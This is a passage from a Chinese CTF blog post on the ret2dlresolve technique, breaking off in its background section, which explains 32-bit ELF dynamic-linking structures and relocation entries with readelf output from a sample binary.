<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>ret2dlresolve | aYoung's Blog</title><meta name="keywords" content="ctf,wp,pwn'"><meta name="author" content="aYoung"><meta name="copyright" content="aYoung"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="背景ELF程序的基本相关结构.ELF可执行文件由ELF头部，程序头部表和其对应的段，节区头部表和对应的节组成。如果一个可执行文件参与动态链接，它的程序头部表将包含类型为PT_DYNAMIC的段，它包含.dynamic节区 12345678typedef struct &amp;#123;    Elf32_Sword     d_tag;    union &amp;#123;        Elf32_Word">
<meta property="og:type" content="article">
<meta property="og:title" content="ret2dlresolve">
<meta property="og:url" content="https://iamayoung.xyz/2021/03/02/ret2dlresolve/index.html">
<meta property="og:site_name" content="aYoung&#39;s Blog">
<meta property="og:description" content="背景ELF程序的基本相关结构.ELF可执行文件由ELF头部，程序头部表和其对应的段，节区头部表和对应的节组成。如果一个可执行文件参与动态链接，它的程序头部表将包含类型为PT_DYNAMIC的段，它包含.dynamic节区 12345678typedef struct &amp;#123;    Elf32_Sword     d_tag;    union &amp;#123;        Elf32_Word">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ftp.bmp.ovh/imgs/2021/03/9be0b7033e8d5f01.png">
<meta property="article:published_time" content="2021-03-02T07:41:46.000Z">
<meta property="article:modified_time" content="2021-03-16T06:36:51.059Z">
<meta property="article:author" content="aYoung">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="wp">
<meta property="article:tag" content="pwn&#39;">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ftp.bmp.ovh/imgs/2021/03/9be0b7033e8d5f01.png"><link rel="shortcut icon" href="/"><link rel="canonical" href="https://iamayoung.xyz/2021/03/02/ret2dlresolve/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-03-16 14:36:51'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://ftp.bmp.ovh/imgs/2020/12/e087cb4981dcab3d.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">43</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://ftp.bmp.ovh/imgs/2021/03/9be0b7033e8d5f01.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">aYoung's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ret2dlresolve</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-03-02T07:41:46.000Z" title="发表于 2021-03-02 15:41:46">2021-03-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-03-16T06:36:51.059Z" title="更新于 2021-03-16 14:36:51">2021-03-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">6.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>29分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><h2 id="ELF程序的基本相关结构"><a href="#ELF程序的基本相关结构" class="headerlink" title="ELF程序的基本相关结构"></a>ELF程序的基本相关结构</h2><p>.ELF可执行文件由ELF头部，程序头部表和其对应的段，节区头部表和对应的节组成。<br>如果一个可执行文件参与动态链接，它的程序头部表将包含类型为<code>PT_DYNAMIC</code>的段，它包含<code>.dynamic</code>节区</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword     d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf32_Word  d_val;</span><br><span class="line">        Elf32_Addr  d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"><span class="keyword">extern</span> Elf32_Dyn_DYNAMIC[];</span><br></pre></td></tr></table></figure>
<p>Elf32_Dyn<br>结构由一个类型值（4字节的tag）加上一个value或指针（共用体），对于不同的类型，后面附加的数值有者不同的含义。下面是和延迟绑定相关的类型值的定义</p>
<table>
<thead>
<tr>
<th>d_tag类型</th>
<th>d_un定义</th>
</tr>
</thead>
<tbody><tr>
<td>DT_STRTAB-5</td>
<td>动态链接字符串表的地址，d_ptr表示<code>.dynstr</code>的地址（address of string table）</td>
</tr>
<tr>
<td>DT_SYMTAB-6</td>
<td>动态链接符号表的地址，d_ptr表示<code>.dynsym</code>的地址（adress of symbol table）</td>
</tr>
<tr>
<td>DT_JMPREL-23</td>
<td>动态链接重定位表的地址，d_ptr表示<code>.rel.plt</code>的地址（address of PLT reloc）</td>
</tr>
<tr>
<td>DT_RELENT-19</td>
<td>单个重定位表项的大小，d_val表示单个重定位表项大小（size of one Rel reloc）</td>
</tr>
<tr>
<td>DT_SYMENT-11</td>
<td>单个符号表项的大小，d_val表示单个符号表项大小（size of one symbol table entry）</td>
</tr>
</tbody></table>
<p><code>readelf -d filename</code>查看某可执行文件的.dynamic节，每个tag对应节区，如下所示，比如<code>JMPREL</code>对应着<code>.rel.plt</code></p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">ayoung@ubuntu:</span>~/Desktop/temp/re2dlresolve$ readelf -d <span class="keyword">test</span></span><br><span class="line"></span><br><span class="line">Dynamic <span class="meta">section</span> <span class="meta">at</span> offset <span class="number">0xf14</span> contains <span class="number">24</span> entries:</span><br><span class="line">  标记        类型                         名称/值</span><br><span class="line"> <span class="number">0x00000001</span> (NEEDED)                     共享库：[libc<span class="number">.</span>so<span class="number">.6</span>]</span><br><span class="line"> <span class="number">0x0000000c</span> (INIT)                       <span class="number">0x80482f0</span></span><br><span class="line"> <span class="number">0x0000000d</span> (FINI)                       <span class="number">0x8048524</span></span><br><span class="line"> <span class="number">0x00000019</span> (INIT_ARRAY)                 <span class="number">0x8049f08</span></span><br><span class="line"> <span class="number">0x0000001b</span> (INIT_ARRAYSZ)               <span class="number">4</span> (bytes)</span><br><span class="line"> <span class="number">0x0000001a</span> (FINI_ARRAY)                 <span class="number">0x8049f0c</span></span><br><span class="line"> <span class="number">0x0000001c</span> (FINI_ARRAYSZ)               <span class="number">4</span> (bytes)</span><br><span class="line"> <span class="number">0x6ffffef5</span> (GNU_HASH)                   <span class="number">0x80481ac</span></span><br><span class="line"> <span class="number">0x00000005</span> (STRTAB)                     <span class="number">0x804822c</span></span><br><span class="line"> <span class="number">0x00000006</span> (SYMTAB)                     <span class="number">0x80481cc</span></span><br><span class="line"> <span class="number">0x0000000a</span> (STRSZ)                      <span class="number">101</span> (bytes)</span><br><span class="line"> <span class="number">0x0000000b</span> (SYMENT)                     <span class="number">16</span> (bytes)</span><br><span class="line"> <span class="number">0x00000015</span> (DEBUG)                      <span class="number">0x0</span></span><br><span class="line"> <span class="number">0x00000003</span> (PLTGOT)                     <span class="number">0x804a000</span></span><br><span class="line"> <span class="number">0x00000002</span> (PLTRELSZ)                   <span class="number">24</span> (bytes)</span><br><span class="line"> <span class="number">0x00000014</span> (PLTREL)                     <span class="built_in">REL</span></span><br><span class="line"> <span class="number">0x00000017</span> (JMPREL)                     <span class="number">0x80482d8</span></span><br><span class="line"> <span class="number">0x00000011</span> (<span class="built_in">REL</span>)                        <span class="number">0x80482d0</span></span><br><span class="line"> <span class="number">0x00000012</span> (RELSZ)                      <span class="number">8</span> (bytes)</span><br><span class="line"> <span class="number">0x00000013</span> (RELENT)                     <span class="number">8</span> (bytes)</span><br><span class="line"> <span class="number">0x6ffffffe</span> (VERNEED)                    <span class="number">0x80482a0</span></span><br><span class="line"> <span class="number">0x6fffffff</span> (VERNEEDNUM)                 <span class="number">1</span></span><br><span class="line"> <span class="number">0x6ffffff0</span> (VERSYM)                     <span class="number">0x8048292</span></span><br><span class="line"> <span class="number">0x00000000</span> (NULL)                       <span class="number">0x0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>节区包含目标文件的所有信息，节的结构下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    ELF32_Word      sh_name;	<span class="comment">//节头部字符串表节区的索引</span></span><br><span class="line">    ELF32_Word      sh_type;	<span class="comment">//节类型</span></span><br><span class="line">    ELF32_Word      sh_flags;	<span class="comment">//节标志，用于描述属性</span></span><br><span class="line">    ELF32_Addr      sh_addr;	<span class="comment">//节的内存映像</span></span><br><span class="line">    ELF32_Off       sh_offset;	<span class="comment">//节的文件偏移</span></span><br><span class="line">    ELF32_Word      sh_size;	<span class="comment">//节的长度</span></span><br><span class="line">    ELF32_Word      sh_link;	<span class="comment">//节头部表索引链接</span></span><br><span class="line">    ELF32_Word      sh_info;	<span class="comment">//附加信息</span></span><br><span class="line">    ELF32_Word      sh_addralign;<span class="comment">//节对齐约束</span></span><br><span class="line">    ELF32_Word      sh_entsize;	<span class="comment">//固定大小的节表项的长度</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure>
<p><code>readelf -S filename</code>查看文件的节区，其中类型为REL的节区包含重定位表项，每个节区按上面的结构体解析，如下所示</p>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">ayoung@ubuntu:~/Desktop/temp/re2dlresolve$ readelf -S test</span><br><span class="line">共有<span class="number"> 36 </span>个节头，从偏移量 0x1b10 开始：</span><br><span class="line"></span><br><span class="line">节头：</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL           <span class="number"> 00000000 </span>000000<span class="number"> 000000 </span>00     <span class="number"> 0 </span> <span class="number"> 0 </span> 0</span><br><span class="line">  [ 1] .interp           PROGBITS       <span class="number"> 08048154 </span>000154<span class="number"> 000013 </span>00   A <span class="number"> 0 </span> <span class="number"> 0 </span> 1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE           <span class="number"> 08048168 </span>000168<span class="number"> 000020 </span>00   A <span class="number"> 0 </span> <span class="number"> 0 </span> 4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE           <span class="number"> 08048188 </span>000188<span class="number"> 000024 </span>00   A <span class="number"> 0 </span> <span class="number"> 0 </span> 4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac<span class="number"> 000020 </span>04   A <span class="number"> 5 </span> <span class="number"> 0 </span> 4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481cc 0001cc<span class="number"> 000060 </span>10   A <span class="number"> 6 </span> <span class="number"> 1 </span> 4</span><br><span class="line">  [ 6] .dynstr           STRTAB          0804822c 00022c<span class="number"> 000065 </span>00   A <span class="number"> 0 </span> <span class="number"> 0 </span> 1</span><br><span class="line">  [ 7] .gnu.version      VERSYM         <span class="number"> 08048292 </span>000292 00000c<span class="number"> 02 </span>  A <span class="number"> 5 </span> <span class="number"> 0 </span> 2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         080482a0 0002a0<span class="number"> 000030 </span>00   A <span class="number"> 6 </span> <span class="number"> 1 </span> 4</span><br><span class="line">  [ 9] .rel.dyn          REL             080482d0 0002d0<span class="number"> 000008 </span>08   A <span class="number"> 5 </span> <span class="number"> 0 </span> 4</span><br><span class="line">  [10] .rel.plt          REL             080482d8 0002d8<span class="number"> 000018 </span>08  AI <span class="number"> 5 </span><span class="number"> 24 </span> 4</span><br><span class="line">  [11] .init             PROGBITS        080482f0 0002f0<span class="number"> 000023 </span>00  AX <span class="number"> 0 </span> <span class="number"> 0 </span> 4</span><br><span class="line">  [12] .plt              PROGBITS       <span class="number"> 08048320 </span>000320<span class="number"> 000040 </span>04  AX <span class="number"> 0 </span> <span class="number"> 0 </span>16</span><br><span class="line">  [13] .plt.got          PROGBITS       <span class="number"> 08048360 </span>000360<span class="number"> 000008 </span>00  AX <span class="number"> 0 </span> <span class="number"> 0 </span> 8</span><br><span class="line">  [14] .text             PROGBITS       <span class="number"> 08048370 </span>000370 0001b2<span class="number"> 00 </span> AX <span class="number"> 0 </span> <span class="number"> 0 </span>16</span><br><span class="line">  [15] .fini             PROGBITS       <span class="number"> 08048524 </span>000524<span class="number"> 000014 </span>00  AX <span class="number"> 0 </span> <span class="number"> 0 </span> 4</span><br><span class="line">  [16] .rodata           PROGBITS       <span class="number"> 08048538 </span>000538<span class="number"> 000008 </span>00   A <span class="number"> 0 </span> <span class="number"> 0 </span> 4</span><br><span class="line">  [17] .eh_frame_hdr     PROGBITS       <span class="number"> 08048540 </span>000540 00002c<span class="number"> 00 </span>  A <span class="number"> 0 </span> <span class="number"> 0 </span> 4</span><br><span class="line">  [18] .eh_frame         PROGBITS        0804856c 00056c 0000cc<span class="number"> 00 </span>  A <span class="number"> 0 </span> <span class="number"> 0 </span> 4</span><br><span class="line">  [19] .init_array       INIT_ARRAY      08049f08 000f08<span class="number"> 000004 </span>00  WA <span class="number"> 0 </span> <span class="number"> 0 </span> 4</span><br><span class="line">  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c<span class="number"> 000004 </span>00  WA <span class="number"> 0 </span> <span class="number"> 0 </span> 4</span><br><span class="line">  [21] .jcr              PROGBITS        08049f10 000f10<span class="number"> 000004 </span>00  WA <span class="number"> 0 </span> <span class="number"> 0 </span> 4</span><br><span class="line">  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8<span class="number"> 08 </span> WA <span class="number"> 6 </span> <span class="number"> 0 </span> 4</span><br><span class="line">  [23] .got              PROGBITS        08049ffc 000ffc<span class="number"> 000004 </span>04  WA <span class="number"> 0 </span> <span class="number"> 0 </span> 4</span><br><span class="line">  [24] .got.plt          PROGBITS        0804a000<span class="number"> 001000 </span>000018<span class="number"> 04 </span> WA <span class="number"> 0 </span> <span class="number"> 0 </span> 4</span><br><span class="line">  [25] .data             PROGBITS        0804a018<span class="number"> 001018 </span>000008<span class="number"> 00 </span> WA <span class="number"> 0 </span> <span class="number"> 0 </span> 4</span><br><span class="line">  [26] .bss              NOBITS          0804a020<span class="number"> 001020 </span>000004<span class="number"> 00 </span> WA <span class="number"> 0 </span> <span class="number"> 0 </span> 1</span><br><span class="line">  [27] .comment          PROGBITS       <span class="number"> 00000000 </span>001020<span class="number"> 000035 </span>01  MS <span class="number"> 0 </span> <span class="number"> 0 </span> 1</span><br><span class="line">  [28] .debug_aranges    PROGBITS       <span class="number"> 00000000 </span>001055<span class="number"> 000020 </span>00     <span class="number"> 0 </span> <span class="number"> 0 </span> 1</span><br><span class="line">  [29] .debug_info       PROGBITS       <span class="number"> 00000000 </span>001075 0000bb<span class="number"> 00 </span>    <span class="number"> 0 </span> <span class="number"> 0 </span> 1</span><br><span class="line">  [30] .debug_abbrev     PROGBITS       <span class="number"> 00000000 </span>001130<span class="number"> 000079 </span>00     <span class="number"> 0 </span> <span class="number"> 0 </span> 1</span><br><span class="line">  [31] .debug_line       PROGBITS       <span class="number"> 00000000 </span>0011a9 00003a<span class="number"> 00 </span>    <span class="number"> 0 </span> <span class="number"> 0 </span> 1</span><br><span class="line">  [32] .debug_str        PROGBITS       <span class="number"> 00000000 </span>0011e3 0000e9<span class="number"> 01 </span> MS <span class="number"> 0 </span> <span class="number"> 0 </span> 1</span><br><span class="line">  [33] .shstrtab         STRTAB         <span class="number"> 00000000 </span>0019c4 00014a<span class="number"> 00 </span>    <span class="number"> 0 </span> <span class="number"> 0 </span> 1</span><br><span class="line">  [34] .symtab           SYMTAB         <span class="number"> 00000000 </span>0012cc 0004b0<span class="number"> 10 </span>   <span class="number"> 35 </span><span class="number"> 52 </span> 4</span><br><span class="line">  [35] .strtab           STRTAB         <span class="number"> 00000000 </span>00177c<span class="number"> 000248 </span>00     <span class="number"> 0 </span> <span class="number"> 0 </span> 1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>类型为REL的节区，包含重定位表项</p>
<ol>
<li>.rel.plt节（第16行）用于函数重定位，.rel.dyn节（第15行）用于变量重定位（全局变量，开了pie保护程序基址改变等）<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr       r_offset; 	<span class="comment">//对于可执行文件，此值为虚拟地址</span></span><br><span class="line">    Elf32_Word       r_info;    <span class="comment">//符号表索引</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*r_offset 此成员给出了需要重定位的位置。对于一个可重定位文件而言，</span></span><br><span class="line"><span class="comment">此值是从需要重定位的符号所在节区头部开始到将被重定位的位置之间的字节偏移。</span></span><br><span class="line"><span class="comment">对于可执行文件或者共享目标文件而言，其取值是需要重定位的虚拟地址，</span></span><br><span class="line"><span class="comment">一般而言，也就是说我们所说的 GOT 表的地址。 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*r_info 此成员给出需要重定位的符号的符号表索引，以及相应的重定位类型。</span></span><br><span class="line"><span class="comment">例如一个调用指令的重定位项将包含被调用函数的符号表索引。如果索引是 STN_UNDEF，</span></span><br><span class="line"><span class="comment">那么重定位使用 0 作为 “符号值”。此外，重定位类型是和处理器相关的。	*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_SYM(i)    ((i)&gt;&gt;8)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_TYPE(i)   ((unsigned char)(i))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_INFO(s,t) (((s)&lt;&lt;8)+(unsigned char)(t))</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<ul>
<li>32位下r_offset和r_info均为四字节</li>
<li>第一行宏定义把传进来的值右移八位，由三个十六进制数组成的数得到结果为最高位的十六进制数</li>
<li>第二行宏定义，取低字节</li>
</ul>
<p>如下，.rel.plt中列出了链接的C库函数</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ayoung<span class="variable">@ubuntu</span><span class="symbol">:~/Desktop/temp/re2dlresolve</span><span class="variable">$ </span>readelf -r test</span><br><span class="line"></span><br><span class="line">重定位节 <span class="string">&#x27;.rel.dyn&#x27;</span> 位于偏移量 <span class="number">0x2d0</span> 含有 <span class="number">1</span> 个条目：</span><br><span class="line"> 偏移量     信息    类型              符号值      符号名称</span><br><span class="line">08049ffc  00000306 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class="line"></span><br><span class="line">重定位节 <span class="string">&#x27;.rel.plt&#x27;</span> 位于偏移量 <span class="number">0x2d8</span> 含有 <span class="number">3</span> 个条目：</span><br><span class="line"> 偏移量     信息    类型              符号值      符号名称</span><br><span class="line">0804a00c  00000107 R_386_JUMP_SLOT   00000000   read<span class="variable">@GLIBC_2</span>.0</span><br><span class="line">0804a010  00000207 R_386_JUMP_SLOT   00000000   __stack_chk_fail<span class="variable">@GLIBC_2</span>.<span class="number">4</span></span><br><span class="line">0804a014  00000407 R_386_JUMP_SLOT   00000000   __libc_start_main<span class="variable">@GLIBC_2</span>.0</span><br></pre></td></tr></table></figure>
<p>以read函数为例，r_offset=0x0804a00c，r_info=0x107<br>.got节保存全局变量偏移表，.got.plt节存储着全局函数偏离表<br>.got.plt对应ELF32_Rel结构中的r_offset值。如图，read函数在GOT表中位于0x0804a00c<br><img src="https://ae01.alicdn.com/kf/U3d27d81d6c0149ffb6886bd582c353ffs.jpg"/></p>
<p>.dynsym节区包含了动态链接符号表，其中<code>ELF32_Sym[num]</code>中的num对应着<code>ELF32_R_SYM（Elf32_Rel-&gt;r_info）</code>。根据宏定义，可得<code>ELF32_R_SYM(Elf32_Rel-&gt;r_info) = (Elf32_Rel-&gt;r_info)&gt;&gt;8</code>（即下标num是用r_info算出来的）</p>
<p>ELF32_Sym结构体如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name;   <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr    st_value;  <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word    st_size;   <span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;   <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;  <span class="comment">/* Symbol visibility under glibc&gt;=2.2 */</span></span><br><span class="line">  Elf32_Section st_shndx;  <span class="comment">/* Section index */</span></span><br><span 